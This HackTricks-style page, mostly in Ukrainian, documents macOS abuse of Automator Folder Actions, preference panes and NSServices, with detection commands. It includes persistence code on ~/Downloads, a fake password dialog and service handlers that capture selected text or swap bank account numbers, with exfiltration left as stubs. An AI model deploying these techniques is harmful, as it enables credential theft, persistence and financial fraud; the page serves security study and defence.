# macOS Automator, Preference Panes & NSServices Зловживання

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Базова інформація

**Automator** — візуальний інструмент автоматизації в macOS. Він виконує **workflows** (`.workflow` bundles), які складаються з **actions** (`.action` bundles). Automator також забезпечує **Folder Actions**, **Quick Actions** та інтеграцію зі **Shortcuts**.

Automator actions — це **плагіни**, що завантажуються в середовище виконання Automator під час запуску workflow. Вони можуть:
- виконувати довільні shell-скрипти
- обробляти файли та дані
- взаємодіяти з додатками через AppleScript
- комбінуватися для побудови складної автоматизації

### Чому це важливо

> [!WARNING]
> Automator workflows можуть бути **social-engineered** для виконання — вони виглядають як прості документ-файли. Бандл `.workflow` може містити вбудовані shell-команди, які виконуються під час запуску workflow. У поєднанні з Folder Actions вони забезпечують **automatic persistence**, що тригериться на файлові події.

### Виявлення
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Атака: Social-Engineered Workflow

Файл-бандл `.workflow` виглядає для більшості користувачів як звичайний документ:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions автоматично виконують workflow, коли файли додаються до відстежуваної папки:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions зберігаються після перезавантажень і виконуються непомітно. Folder Action у `~/Downloads` означає, що **кожен завантажений файл запускає ваш payload** — включно з файлами з Safari, Chrome, AirDrop та вкладеннями електронної пошти.
 
---

## Панелі налаштувань

### Основна інформація

Панелі налаштувань (`.prefPane` bundles) — це плагіни, завантажувані в **System Settings** (раніше System Preferences). Вони надають конфігураційні UI-панелі для системних або сторонніх функцій.

### Чому це важливо

- Панелі налаштувань виконуються в межах **процесу System Settings**, який може мати **elevated TCC permissions** (accessibility, full disk access в деяких контекстах)
- Сторонні панелі налаштувань завантажуються в цей довірений процес, **успадковуючи його контекст безпеки**
- Користувачі встановлюють панелі налаштувань, **подвійним клацанням** — простий social engineering
- Після встановлення вони **зберігаються** і завантажуються щоразу, коли System Settings відкриває цю панель

### Виявлення
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Атака: Privilege Context Hijacking

Зловмисна панель налаштувань успадковує контекст безпеки Системних налаштувань:
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside System Settings process
// It has System Settings' TCC permissions

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Атака: Persistence через встановлення
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Атака: UI Phishing

Панель налаштувань може імітувати легітимні системні UI-панелі, щоб **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices** дозволяють додаткам надавати функціональність іншим додаткам через **Services menu** (правий клік → Services). Коли користувач виділяє текст або дані та викликає сервіс, виділені дані **відправляються постачальнику сервісу** для обробки.

Сервіси оголошуються в додатку в `Info.plist` під ключем `NSServices` і реєструються на сервері буфера обміну (`pbs`).

### Why This Matters

- Сервіси отримують **потік даних між додатками** — виділений текст з будь-якого додатку надсилається в сервіс
- Зловмисний сервіс може перехоплювати дані з менеджерів паролів, поштових клієнтів, фінансових додатків
- Сервіси можуть **повертати змінені дані** додатку, що викликав їх (man-in-the-middle під час операцій виділення)
- Назви сервісів можна підробити, щоб виглядати легітимними ("Format Text", "Encrypt Selection", "Share")

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Атака: Сервіс перехоплення даних
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Атака: Зміна даних (Man-in-the-Middle)

Служба може **змінювати повернені дані**, при цьому видаючи себе за легітимну функцію:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
---

## Ланцюги атак між техніками

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Панель налаштувань → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane runs inside System Settings context
4. Inherits System Settings' TCC grants
5. Access protected data, control other apps via inherited Accessibility
```
### NSService → Крадіжка менеджера паролів
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Джерела

* [Apple Developer — Automator Programming Guide](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
* [Apple Developer — Preference Pane Programming Guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
* [Apple Developer — Services Implementation Guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
* [Objective-See — Folder Action Persistence](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
